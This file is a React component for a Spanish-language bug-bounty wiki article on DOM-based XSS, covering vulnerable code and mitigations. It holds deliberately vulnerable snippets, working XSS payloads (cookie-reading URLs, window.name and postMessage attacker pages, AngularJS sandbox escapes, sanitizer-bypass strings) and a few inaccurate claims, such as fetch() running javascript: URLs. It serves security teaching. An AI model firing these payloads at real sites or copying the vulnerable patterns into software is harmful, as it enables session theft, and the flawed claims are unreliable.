/**
 * XSS DOM-BASED
 * XSS que vive solo en el DOM del navegador
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Code, Shield, Zap, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function XSSDOMBasedContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="DOM-Based XSS - XSS Sin Servidor">
        <Paragraph>
          <Strong>DOM-Based XSS</Strong> es XSS donde el payload NUNCA toca el servidor. 
          El JavaScript vulnerable procesa input directamente en el navegador usando 
          <InlineCode>location.hash</InlineCode>, <InlineCode>document.URL</InlineCode>, 
          o <InlineCode>window.name</InlineCode>.
        </Paragraph>

        <AlertDanger title="Por Qué es Peligroso">
          <ul className="mt-2 space-y-1">
            <ListItem>🔍 WAF/IDS no lo detectan (nunca llega al servidor)</ListItem>
            <ListItem>📝 No aparece en server logs</ListItem>
            <ListItem>🎯 Bypass de CSP si hay unsafe-eval</ListItem>
            <ListItem>🚪 Evade filtros server-side</ListItem>
            <ListItem>⚡ Ejecuta instantáneamente (sin page reload)</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="sinks-sources" title="1. Sources y Sinks - Anatomía del DOM XSS">
        <Paragraph>
          DOM XSS ocurre cuando datos de un <Strong>Source</Strong> (input controlable) 
          fluyen a un <Strong>Sink</Strong> (función peligrosa) sin sanitización.
        </Paragraph>

        <Subsection title="Sources Controlables por Atacante">
          <HighlightBox color="red">
            <Strong>Sources comunes:</Strong>
            <ul className="mt-2 space-y-1">
              <ListItem><InlineCode>location.hash</InlineCode> - Fragmento URL (#payload)</ListItem>
              <ListItem><InlineCode>location.search</InlineCode> - Query params (?q=payload)</ListItem>
              <ListItem><InlineCode>document.URL</InlineCode> - URL completa</ListItem>
              <ListItem><InlineCode>document.referrer</InlineCode> - Referer header</ListItem>
              <ListItem><InlineCode>window.name</InlineCode> - Nombre de ventana</ListItem>
              <ListItem><InlineCode>postMessage</InlineCode> - Mensajes cross-window</ListItem>
            </ul>
          </HighlightBox>
        </Subsection>

        <Subsection title="Sinks Peligrosos">
          <CodeBlock
            language="javascript"
            title="Sinks críticos que ejecutan código"
            code={`// 🔥 SINKS DE EJECUCIÓN DIRECTA
eval(userInput)
setTimeout(userInput, 100)
setInterval(userInput, 100)
Function(userInput)
execScript(userInput)  // IE legacy

// 🎯 SINKS DE HTML INJECTION
element.innerHTML = userInput
element.outerHTML = userInput
document.write(userInput)
document.writeln(userInput)

// ⚙️ SINKS DE DOM MANIPULATION
element.insertAdjacentHTML('beforeend', userInput)
element.setAttribute('onclick', userInput)

// 🚪 SINKS DE NAVEGACIÓN
location = userInput
location.href = userInput
location.assign(userInput)
window.open(userInput)

// 📜 SINKS DE SCRIPT LOADING
script.src = userInput
script.text = userInput`}
          />
        </Subsection>
      </Section>

      <Section id="location-hash" title="2. DOM XSS via location.hash">
        <CodeBlock
          language="html"
          title="❌ VULNERABLE - innerHTML con location.hash"
          code={`<!DOCTYPE html>
<html>
<head>
  <title>Vulnerable App</title>
</head>
<body>
  <h1>Welcome Page</h1>
  <div id="content"></div>
  
  <script>
    // ❌ VULNERABLE - Tomar hash y renderizar sin sanitización
    const fragment = location.hash.substring(1);  // Remover #
    
    document.getElementById('content').innerHTML = fragment;
  </script>
</body>
</html>`}
        />

        <CodeBlock
          language="text"
          title="Payload XSS en URL fragment"
          code={`https://victim.com/page.html#<img src=x onerror=alert(document.cookie)>

# Cómo funciona:
1. location.hash === "#<img src=x onerror=alert(document.cookie)>"
2. fragment === "<img src=x onerror=alert(document.cookie)>"
3. innerHTML ejecuta el onerror handler
4. ✅ XSS ejecutado SIN tocar el servidor`}
        />

        <TerminalOutput title="Request en Network tab">
          {`GET /page.html HTTP/1.1
Host: victim.com

# ⚠️ Nota: El #payload NO se envía al servidor!
# Solo existe en el navegador
# WAF/IDS nunca lo ven`}
        </TerminalOutput>
      </Section>

      <Section id="document-url" title="3. DOM XSS via document.URL">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Extraer parámetro de URL"
          code={`// Función común para obtener query params
function getParameterByName(name) {
  const url = document.URL;  // ← Source
  
  const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
  const results = regex.exec(url);
  
  if (!results) return null;
  if (!results[2]) return '';
  
  return decodeURIComponent(results[2].replace(/\\+/g, ' '));
}

// Uso vulnerable
const userName = getParameterByName('name');
document.getElementById('welcome').innerHTML = 'Hello ' + userName;  // ← Sink`}
        />

        <CodeBlock
          language="text"
          title="Payload - XSS via query parameter"
          code={`https://victim.com/profile?name=<img src=x onerror=alert(1)>

# Alternativa con encoded payload
https://victim.com/profile?name=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E`}
        />
      </Section>

      <Section id="eval-sink" title="4. DOM XSS via eval()">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - eval() con user input"
          code={`// Analytics tracker vulnerable
window.addEventListener('hashchange', function() {
  const action = location.hash.substring(1);
  
  // ❌ VULNERABLE - eval() es código execution directa
  eval('trackEvent("' + action + '")');
});`}
        />

        <CodeBlock
          language="text"
          title="Payload - RCE via eval()"
          code={`https://victim.com/analytics#");alert(document.cookie);//

# Código ejecutado:
eval('trackEvent(""); alert(document.cookie); //")');

# Resultado: Cookie leaked`}
        />

        <AlertWarning>
          <InlineCode>eval()</InlineCode> es extremadamente peligroso. Usar <InlineCode>JSON.parse()</InlineCode> 
          para datos, nunca eval().
        </AlertWarning>
      </Section>

      <Section id="window-name" title="5. DOM XSS via window.name">
        <Paragraph>
          <InlineCode>window.name</InlineCode> persiste entre navegaciones en la misma tab. 
          Un atacante puede pre-setear el value malicioso.
        </Paragraph>

        <CodeBlock
          language="html"
          title="❌ VULNERABLE - Leer window.name"
          code={`<!DOCTYPE html>
<html>
<body>
  <h1>Dashboard</h1>
  <div id="user-panel"></div>
  
  <script>
    // ❌ VULNERABLE - Confiar en window.name
    if (window.name) {
      const userData = window.name;
      document.getElementById('user-panel').innerHTML = userData;
    }
  </script>
</body>
</html>`}
        />

        <CodeBlock
          language="html"
          title="Ataque - Pre-setear window.name malicioso"
          code={`<!-- Página del atacante -->
<!DOCTYPE html>
<html>
<body>
  <script>
    // 1. Setear window.name con payload
    window.name = '<img src=x onerror=alert(document.domain)>';
    
    // 2. Redirigir a página vulnerable
    location = 'https://victim.com/dashboard';
    
    // 3. window.name PERSISTE en la navegación
    // 4. victim.com lee window.name y ejecuta XSS
  </script>
</body>
</html>`}
        />
      </Section>

      <Section id="postmessage-xss" title="6. DOM XSS via postMessage">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - postMessage sin validación"
          code={`// Página vulnerable escucha mensajes
window.addEventListener('message', function(event) {
  // ❌ VULNERABLE - No verificar event.origin
  // ❌ VULNERABLE - No sanitizar event.data
  
  const message = event.data;
  document.getElementById('notification').innerHTML = message;
});`}
        />

        <CodeBlock
          language="html"
          title="Payload - XSS via iframe postMessage"
          code={`<!-- Página atacante -->
<!DOCTYPE html>
<html>
<body>
  <iframe id="victim" src="https://victim.com/notifications"></iframe>
  
  <script>
    window.onload = function() {
      const victimWindow = document.getElementById('victim').contentWindow;
      
      // Enviar payload XSS
      const payload = '<img src=x onerror=alert(document.cookie)>';
      
      victimWindow.postMessage(payload, '*');
    };
  </script>
</body>
</html>`}
        />
      </Section>

      <Section id="angular-bypass" title="7. AngularJS Template Injection">
        <CodeBlock
          language="html"
          title="❌ VULNERABLE - AngularJS 1.x con ng-bind-html"
          code={`<!-- App vulnerable -->
<!DOCTYPE html>
<html ng-app>
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
</head>
<body>
  <div ng-controller="SearchController">
    <h1>Search Results for: <span ng-bind-html="searchQuery"></span></h1>
  </div>
  
  <script>
    function SearchController($scope, $location) {
      // ❌ VULNERABLE - Tomar query de URL sin sanitización
      $scope.searchQuery = $location.search().q;
    }
  </script>
</body>
</html>`}
        />

        <CodeBlock
          language="text"
          title="Payload - Angular template injection"
          code={`https://victim.com/search?q={{constructor.constructor('alert(1)')()}}

# Alternativa con $eval:
?q={{$eval.constructor('alert(document.cookie)')()}}

# Payload para AngularJS 1.6+:
?q={{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}`}
        />
      </Section>

      <Section id="dom-clobbering" title="8. DOM Clobbering">
        <Paragraph>
          <Strong>DOM Clobbering</Strong> abusa de HTML para sobrescribir propiedades globales 
          y causar XSS en código que asume ciertas variables están definidas.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Código que asume window.config existe"
          code={`// Código vulnerable que usa window.config
if (window.config && window.config.apiUrl) {
  fetch(window.config.apiUrl + '/data')
    .then(response => response.json())
    .then(data => {
      // Procesar data
    });
}`}
        />

        <CodeBlock
          language="html"
          title="Payload - Clobbering window.config"
          code={`<!-- Atacante inyecta HTML (comment, profile bio, etc.) -->
<a id="config" href="https://attacker.com/evil">
  <a id="config" name="apiUrl" href="javascript:alert(document.cookie)">
</a>

<!-- Resultado:
window.config.apiUrl === "javascript:alert(document.cookie)"

fetch() ejecuta javascript: protocol → XSS
-->`}
        />
      </Section>

      <Section id="herramientas" title="9. Herramientas de Detección">
        <Subsection title="DOM Invader (Burp Suite)">
          <AlertTip>
            <Strong>DOM Invader</Strong> es una extensión de Burp que detecta DOM XSS automáticamente:
            <ul className="mt-2 space-y-1">
              <ListItem>Instrumenta sources (location.hash, etc.)</ListItem>
              <ListItem>Colorea sinks peligrosos en DevTools</ListItem>
              <ListItem>Genera PoCs automáticamente</ListItem>
              <ListItem>Detecta DOM clobbering</ListItem>
            </ul>
          </AlertTip>

          <CodeBlock
            language="text"
            title="Usar DOM Invader"
            code={`1. Instalar Burp Suite Professional
2. Abrir Burp Browser
3. DOM Invader se activa automáticamente
4. Visitar página vulnerable
5. Ingresar canary string en inputs: "testpayload123"
6. DOM Invader alerta si canary llega a sink peligroso
7. Generar PoC automático en panel de Burp`}
          />
        </Subsection>

        <Subsection title="DOMPurify Testing">
          <CodeBlock
            language="bash"
            title="Probar bypass de sanitizers"
            code={`# Payloads comunes para bypassear DOMPurify
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src=javascript:alert(1)>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">

# mXSS (mutation XSS):
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

# Template literal injection:
\${alert(document.domain)}`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Prevenir DOM-Based XSS">
          Aplicar TODAS estas protecciones.
        </AlertDanger>

        <Subsection title="1. Usar textContent en lugar de innerHTML">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - textContent no ejecuta HTML"
            code={`// ❌ VULNERABLE
const name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello ' + name;

// ✅ SEGURO - textContent escapa automáticamente
const name = location.hash.substring(1);
document.getElementById('welcome').textContent = 'Hello ' + name;

// Alternativa: createTextNode
const textNode = document.createTextNode('Hello ' + name);
document.getElementById('welcome').appendChild(textNode);`}
          />
        </Subsection>

        <Subsection title="2. Sanitizar con DOMPurify">
          <CodeBlock
            language="html"
            title="✅ SEGURO - DOMPurify sanitiza HTML"
            code={`<!DOCTYPE html>
<html>
<head>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
</head>
<body>
  <div id="content"></div>
  
  <script>
    const userInput = location.hash.substring(1);
    
    // ✅ SEGURO - DOMPurify remueve payloads
    const clean = DOMPurify.sanitize(userInput);
    
    document.getElementById('content').innerHTML = clean;
    
    // Payload: <img src=x onerror=alert(1)>
    // Resultado: <img src="x">  (onerror removido)
  </script>
</body>
</html>`}
          />
        </Subsection>

        <Subsection title="3. Validar event.origin en postMessage">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Verificar origin de mensaje"
            code={`window.addEventListener('message', function(event) {
  // ✅ Verificar origin
  const allowedOrigins = ['https://trusted.com', 'https://app.trusted.com'];
  
  if (!allowedOrigins.includes(event.origin)) {
    console.error('Unauthorized origin:', event.origin);
    return;
  }
  
  // ✅ Validar estructura de data
  if (typeof event.data !== 'object' || !event.data.type) {
    return;
  }
  
  // ✅ Sanitizar antes de usar
  const sanitized = DOMPurify.sanitize(event.data.message);
  
  document.getElementById('notification').textContent = sanitized;
});`}
          />
        </Subsection>

        <Subsection title="4. CSP con unsafe-inline bloqueado">
          <CodeBlock
            language="text"
            title="✅ SEGURO - CSP estricto"
            code={`Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-{random}'; 
  object-src 'none';
  base-uri 'none';

# Bloquear:
# - 'unsafe-inline' (previene innerHTML XSS)
# - 'unsafe-eval' (previene eval() XSS)
# - javascript: URIs`}
          />
        </Subsection>

        <Subsection title="5. Evitar Sinks Peligrosos">
          <HighlightBox color="green">
            <Strong>Reemplazos seguros:</Strong>
            <ul className="mt-2 space-y-1">
              <ListItem>❌ <InlineCode>eval(code)</InlineCode> → ✅ <InlineCode>JSON.parse(data)</InlineCode></ListItem>
              <ListItem>❌ <InlineCode>setTimeout(code, 100)</InlineCode> → ✅ <InlineCode>setTimeout(function, 100)</InlineCode></ListItem>
              <ListItem>❌ <InlineCode>innerHTML</InlineCode> → ✅ <InlineCode>textContent</InlineCode></ListItem>
              <ListItem>❌ <InlineCode>location = url</InlineCode> → ✅ <InlineCode>location.href = sanitize(url)</InlineCode></ListItem>
              <ListItem>❌ <InlineCode>document.write()</InlineCode> → ✅ <InlineCode>appendChild()</InlineCode></ListItem>
            </ul>
          </HighlightBox>
        </Subsection>

        <Subsection title="6. Usar Framework con Auto-escaping">
          <CodeBlock
            language="jsx"
            title="✅ SEGURO - React escapa automáticamente"
            code={`import React, { useEffect, useState } from 'react';

function Dashboard() {
  const [name, setName] = useState('');
  
  useEffect(() => {
    // Leer de URL hash
    const hashName = window.location.hash.substring(1);
    setName(hashName);
  }, []);
  
  return (
    <div>
      {/* ✅ SEGURO - React escapa automáticamente */}
      <h1>Hello {name}</h1>
      
      {/* ❌ PELIGROSO - dangerouslySetInnerHTML deshabilita escaping */}
      {/* <div dangerouslySetInnerHTML={{__html: name}} /> */}
    </div>
  );
}`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: CSP Bypass</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/csp-bypass`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Bypassear Content Security Policy</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
